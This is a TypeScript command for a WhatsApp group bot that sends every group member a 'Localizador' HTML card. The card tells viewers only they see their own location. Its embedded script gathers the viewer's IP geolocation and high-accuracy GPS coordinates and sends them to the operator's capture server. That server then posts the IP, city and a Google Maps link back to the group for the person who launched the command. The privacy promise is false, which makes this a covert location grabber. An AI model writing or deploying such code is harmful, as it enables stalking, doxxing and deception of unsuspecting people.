import { randomUUID } from "node:crypto";
import { createServer, type Server } from "node:http";
import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── store (global, sobrevive reload) ───────────────────────── */

type LocateSession = {
  id: string;
  group: string;
  author: string;
  msg: any;
  hits: Set<string>;
  createdAt: number;
};

const G = globalThis as any;
const sessions: Map<string, LocateSession> = (G.__locSessions ??= new Map());
const sockRef: { current: any } = (G.__locSock ??= { current: null });
const startedRef: { current: boolean } = (G.__locStarted ??= { current: false });

const TTL = 30 * 60 * 1000;
const PORT = Number(process.env.LOCATE_PORT || 8787);
const MASK = process.env.LOCATE_MASK_IP === "1";

function sweep() {
  const now = Date.now();
  for (const [id, s] of sessions) if (now - s.createdAt > TTL) sessions.delete(id);
}

function maskIp(ip: string) {
  if (!ip) return "—";
  const v4 = ip.split(".");
  return v4.length === 4 ? `${v4[0]}.${v4[1]}.${v4[2]}.*` : ip;
}

/* ───────────────────────── servidor de captura ───────────────────────── */

const CORS: Record<string, string> = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type",
};

function clientIp(req: any) {
  const fwd = String(req.headers["x-forwarded-for"] || "").split(",")[0].trim();
  return (fwd || req.socket.remoteAddress || "").replace(/^::ffff:/, "");
}

async function geoFromIp(ip: string) {
  try {
    const r = await fetch(`https://ipapi.co/${ip}/json/`, {
      headers: { "User-Agent": "locate-bot" },
    });
    if (!r.ok) return null;
    const j: any = await r.json();
    if (!j || j.error) return null;
    return { city: j.city, region: j.region, country: j.country_name, lat: j.latitude, lon: j.longitude };
  } catch {
    return null;
  }
}

async function handle(req: any, res: any) {
  Object.entries(CORS).forEach(([k, v]) => res.setHeader(k, v));
  if (req.method === "OPTIONS") return res.writeHead(204).end();

  const url = new URL(req.url || "/", `http://${req.headers.host}`);
  const m = url.pathname.match(/^\/l\/([A-Za-z0-9_-]{6,48})$/);
  if (!m) return res.writeHead(404, { "Content-Type": "application/json" }).end('{"ok":false}');

  const s = sessions.get(m[1]);
  if (!s) return res.writeHead(410, { "Content-Type": "application/json" }).end('{"ok":false,"expired":true}');

  let raw = "";
  for await (const chunk of req) {
    raw += chunk;
    if (raw.length > 4096) break;
  }

  let body: any = {};
  try { body = JSON.parse(raw || "{}"); } catch {}

  const ip = clientIp(req);
  let lat = Number(body.lat) || 0;
  let lon = Number(body.lon) || 0;
  let city = body.city || null;
  let region = body.region || null;
  let country = body.country || null;
  const acc = Number(body.acc) || 0;
  const src = body.src === "gps" ? "gps" : "ip";

  if (!lat || !lon) {
    const geo = await geoFromIp(ip);
    if (!geo) return res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true,"geo":false}');
    lat = geo.lat; lon = geo.lon; city = geo.city; region = geo.region; country = geo.country;
  }

  res.writeHead(200, { "Content-Type": "application/json" }).end('{"ok":true}');

  const key = `${ip}|${Math.round(lat * 250)}|${Math.round(lon * 250)}`;
  if (s.hits.has(key)) return;
  s.hits.add(key);

  const sock = sockRef.current;
  if (!sock) return;

  const place = [city, region, country].filter(Boolean).join(", ") || "desconocido";
  const text =
    `📍 *${place}*\n` +
    `\`${MASK ? maskIp(ip) : ip}\`\n` +
    `https://maps.google.com/?q=${lat},${lon}` +
    (src === "gps" ? `\n_precisión ±${acc} m_` : "");

  await sock.sendMessage(s.group, { text, mentions: [s.author] }, { quoted: s.msg }).catch(() => undefined);
}

function startServer() {
  if (startedRef.current) return;
  startedRef.current = true;

  const server: Server = createServer((req, res) => {
    handle(req, res).catch(() => {
      try { res.writeHead(500).end('{"ok":false}'); } catch {}
    });
  });

  server.on("error", (e: any) => {
    if (e?.code === "EADDRINUSE") console.log(`[locate] puerto ${PORT} ocupado`);
  });

  server.listen(PORT, () => console.log(`[locate] escuchando :${PORT} · ttl ${TTL / 60000}m`));
  setInterval(sweep, 5 * 60 * 1000).unref?.();
}

/* ───────────────────────── builder del tapete ───────────────────────── */

const buildLocatePayload = (o: { sid: string; base: string; name: string }) => {
  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font-family:-apple-system,'Segoe UI',Roboto,system-ui,sans-serif;background:#070b14;color:#e9edf7;padding:12px}
.wrap{max-width:430px;margin:0 auto}
.card{background:linear-gradient(165deg,#121a30,#0a0f1c 60%,#080c16);border:1px solid #22304d;border-radius:18px;overflow:hidden;box-shadow:0 20px 50px rgba(0,0,0,.65)}
.head{display:flex;align-items:center;gap:10px;padding:14px 15px;border-bottom:1px solid #1b2740;background:linear-gradient(90deg,rgba(0,229,255,.10),rgba(0,229,255,0))}
.dot{width:9px;height:9px;border-radius:50%;background:#00e5ff;box-shadow:0 0 12px #00e5ff;animation:p 1.4s infinite}
@keyframes p{0%,100%{opacity:1}50%{opacity:.25}}
.title{font-size:12.5px;letter-spacing:1.4px;font-weight:800;text-transform:uppercase;color:#9fe9ff}
.body{padding:16px 15px}
.hello{font-size:15px;font-weight:700;margin-bottom:4px}
.hello b{color:#00e5ff}
.sub{font-size:12px;color:#8fa3c4;margin-bottom:14px}
.row{display:flex;gap:8px;margin-bottom:8px}
.k{font-size:11px;color:#7f93b5;width:88px;flex:none}
.v{font-size:12.5px;font-weight:700;color:#fff;word-break:break-all}
.map{border-radius:12px;overflow:hidden;border:1px solid #22304d;margin-top:12px;background:#0d1424;position:relative;min-height:170px}
.map iframe{display:block;width:100%;height:190px;border:0}
.badge{position:absolute;left:8px;top:8px;font-size:9.5px;letter-spacing:.8px;font-weight:800;text-transform:uppercase;background:rgba(0,0,0,.72);color:#7cffb2;border:1px solid #2b6b4b;border-radius:6px;padding:3px 7px;z-index:2}
.foot{padding:11px 15px;border-top:1px solid #1b2740;font-size:10.5px;color:#63769a;display:flex;justify-content:space-between}
.err{font-size:12px;color:#ff8f8f}
</style>
<div class="wrap"><div class="card">
<div class="head"><div class="dot"></div><div class="title">Localizador</div></div>
<div class="body">
<div class="hello">Hola <b>@__NAME__</b></div>
<div class="sub" id="sub">Rastreando tu señal...</div>
<div id="out"></div>
</div>
<div class="foot"><span>solo tú ves esto</span><span id="st">·</span></div>
</div></div>
<script>
var SID="__SID__",BASE="__BASE__";
var $=function(i){return document.getElementById(i)};
function paint(d){
  $('sub').textContent='Esta es tu ubicación, @__NAME__';
  $('out').innerHTML=
   '<div class="row"><div class="k">IP pública</div><div class="v">'+(d.ip||'—')+'</div></div>'+
   '<div class="row"><div class="k">Ciudad</div><div class="v">'+(d.city||'—')+'</div></div>'+
   '<div class="row"><div class="k">Región</div><div class="v">'+(d.region||'—')+'</div></div>'+
   '<div class="row"><div class="k">País</div><div class="v">'+(d.country||'—')+'</div></div>'+
   '<div class="row"><div class="k">Coordenadas</div><div class="v">'+d.lat.toFixed(5)+', '+d.lon.toFixed(5)+'</div></div>'+
   '<div class="map"><span class="badge">exacto</span><iframe loading="lazy" src="https://maps.google.com/maps?q='+d.lat+','+d.lon+'&z=17&output=embed"></iframe></div>';
  $('st').textContent=d.src==='gps'?'GPS':'IP';
}
function post(d){
  try{fetch(BASE+'/l/'+SID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)}).catch(function(){})}catch(e){}
}
function start(){
  fetch('https://ipapi.co/json/').then(function(r){return r.json()}).then(function(ipd){
    if(!ipd||!ipd.latitude){$('sub').textContent='No se pudo leer la red';$('out').innerHTML='<div class="err">Servicio no disponible.</div>';return}
    var d={ip:ipd.ip,city:ipd.city,region:ipd.region,country:ipd.country_name,lat:ipd.latitude,lon:ipd.longitude,src:'ip'};
    paint(d);post(d);
    if(navigator.geolocation){
      navigator.geolocation.getCurrentPosition(function(p){
        var g={ip:d.ip,city:d.city,region:d.region,country:d.country,lat:p.coords.latitude,lon:p.coords.longitude,acc:Math.round(p.coords.accuracy)||0,src:'gps'};
        paint(g);post(g);
      },function(){},{enableHighAccuracy:true,timeout:8000,maximumAge:0});
    }
  }).catch(function(){
    $('sub').textContent='No se pudo leer la red';
    $('out').innerHTML='<div class="err">Servicio no disponible.</div>';
  });
}
start();
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [o.base, "https://ipapi.co", "https://maps.google.com", "https://www.google.com"],
        payload: html
          .replace(/__SID__/g, o.sid)
          .replace(/__BASE__/g, o.base)
          .replace(/__NAME__/g, o.name),
      },
    },
  };
};

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["localizar", "loc", "ubicar"],
  category: "group",
  description: "Lanza un localizador privado: cada quien ve su propia IP y mapa.",
  async run(ctx: CommandContext) {
    const { reply, react, sock, from, msg } = ctx;

    const base = (process.env.LOCATE_BASE_URL || "").replace(/\/+$/, "");
    if (!base) {
      await reply("⚙️ Falta configurar *LOCATE_BASE_URL* en el .env.").catch(() => undefined);
      return;
    }
    if (!from.endsWith("@g.us")) {
      await reply("Solo funciona en grupos.").catch(() => undefined);
      return;
    }

    startServer();
    await react("🛰️").catch(() => undefined);

    const author: string = (msg.key as any).participant || from;
    const num = author.split("@")[0].split(":")[0];
    const name: string = (ctx as any).pushName || (ctx as any).senderName || num;

    let mentions: string[] = [author];
    try {
      const meta: any = await sock.groupMetadata(from);
      mentions = meta.participants.map((p: any) => p.id);
      if (!mentions.includes(author)) mentions.push(author);
    } catch {}

    const sid = randomUUID().replace(/-/g, "").slice(0, 24);

    sessions.set(sid, { id: sid, group: from, author, msg, hits: new Set(), createdAt: Date.now() });
    sockRef.current = sock;
    setTimeout(() => sessions.delete(sid), TTL).unref?.();

    try {
      const ping = await sock.sendMessage(
        from,
        {
          text: `📍 @${num} activó el localizador.\n\nAbre la tarjeta de abajo — cada quien ve la suya.`,
          mentions,
        },
        { quoted: msg },
      );

      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("🛰️ Localizador // LuferOS")
        .setFooter("Abre la tarjeta · cada quien ve la suya");

      rich.addSection(buildLocatePayload({ sid, base, name }));
      await rich.send(from, { quoted: ping ?? msg });

      await react("✅").catch(() => undefined);
    } catch {
      await react("❌").catch(() => undefined);
      await reply(`${fytBold("Error")} al renderizar el localizador.`).catch(() => undefined);
    }
  },
};
